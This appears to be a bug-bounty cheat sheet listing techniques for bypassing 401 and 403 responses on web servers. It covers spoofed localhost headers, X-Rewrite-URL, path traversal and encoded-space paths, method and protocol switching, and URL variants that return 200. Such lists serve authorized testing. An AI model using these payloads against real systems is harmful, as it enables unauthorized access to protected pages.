[1. 401 Unauthorized Bypass](https://github.com/noobsdt/bbtechniques/blob/master/4XX%20Bypass/README.md#401-unauthorized-bypass)

[2. 403 Forbidden Bypass](https://github.com/noobsdt/bbtechniques/blob/master/4XX%20Bypass/README.md#403-forbidden-bypass)


# 401 Unauthorized Bypass

```
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-Origin: 127.0.0.1
```

# 403 Forbidden Bypass

### Change request method.
```
POST -> GET
GET -> POST
```

### Change Protocol
```
http -> https
https -> http
```

### Use space symbol.
```
GET /admin%20
GET /admin%09
```

### X-Rewrite-URL header
```
GET /index.html
X-Rewrite-URL: /admin
```
### Use Path Traversal
```
GET /%2e/admin
GET /admin/..;/
```
			
### X-Real-IP/X-Forwrded-For
```
GET /admin
X-Real-IP: 127.0.0.1
```
```
GET /admin
X-Forwarded-For: 127.0.0.1
```

### Other Techniques
target.com/secret -> ```403 Forbidden```

target.com/secret/ -> ```200 Ok```

target.com//secret// -> ```200 Ok```

target.com/./secret/./ -> ```200 Ok```

target.com/secret/* -> ```200 Ok```

target.com/. -> ```200 Ok```
